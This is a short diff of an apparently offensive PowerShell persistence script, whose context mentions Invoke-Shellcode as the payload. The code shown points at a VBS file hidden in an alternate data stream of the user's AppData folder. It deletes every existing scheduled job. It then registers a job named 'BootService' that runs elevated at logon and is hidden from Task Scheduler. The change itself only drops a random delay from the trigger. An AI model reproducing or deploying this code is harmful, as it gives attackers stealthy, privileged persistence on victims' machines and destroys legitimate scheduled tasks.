@@ -99,7 +99,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        $script = "$env:USERPROFILE\AppData:$vbsFile"
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
       # $Trig = New-JobTrigger -Once -At (Get-Date).AddMinutes(30) -RepeatIndefinitely -RepetitionInterval "00:30:00"
-       $Trig = New-JobTrigger -AtLogOn -RandomDelay 00:01:00
+       $Trig = New-JobTrigger -AtLogOn
        $scriptblock = [scriptblock]::Create($script)
        Get-ScheduledJob | Unregister-ScheduledJob -Force
        Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option
